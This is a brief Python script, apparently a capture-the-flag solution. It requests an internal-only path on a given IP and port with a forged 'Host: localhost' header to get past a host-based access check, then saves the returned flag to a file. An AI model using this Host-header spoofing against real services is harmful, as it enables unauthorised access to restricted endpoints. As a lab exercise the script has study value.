from requests import Session

url = "http://152.118.201.254:18011/top-secret-internal-stuff"
conn = Session()
headers = {
	'Host': 'localhost'
}

flag = conn.get(url = url, headers = headers).text
open("test.html", "w+").write(flag.encode("utf-8"))
